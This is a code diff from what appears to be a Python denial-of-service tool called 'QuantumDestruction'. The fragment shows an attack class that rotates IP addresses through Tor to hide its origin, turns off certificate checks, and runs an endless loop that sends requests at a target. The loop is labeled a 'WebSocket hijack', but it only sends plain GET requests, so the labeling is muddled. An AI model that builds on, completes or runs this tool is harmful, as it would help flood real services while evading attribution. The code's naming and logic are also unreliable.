@@ -8,14 +8,12 @@ from httpx import Client
 from stem.control import Controller
 from stem import Signal
 import base64
-import json
-import undetected_chromedriver as uc
 
 class QuantumDestruction:
     def __init__(self, target, attack_type):
         self.target = target
         self.attack_type = attack_type
-        self.http_client = Client(http2=True, http3=True, verify=False)
+        self.http_client = Client(http2=True, verify=False)
         self.tor_controller = Controller.from_port(port=9051)
 
     def rotate_ip(self):
@@ -59,7 +57,7 @@ class QuantumDestruction:
     def websocket_hijack(self):
         while True:
             try:
-                ws_url = f"ws://{self.target}" if self.attack_type == "HTTP" else self.target
+                ws_url = f"ws://{self.target}" if self.attack_type == "HTTP" else f"https://{self.target}"
                 response = requests.get(ws_url, timeout=3)
                 print(f"WebSocket Hijack Sent: {response.status_code}")
             except:
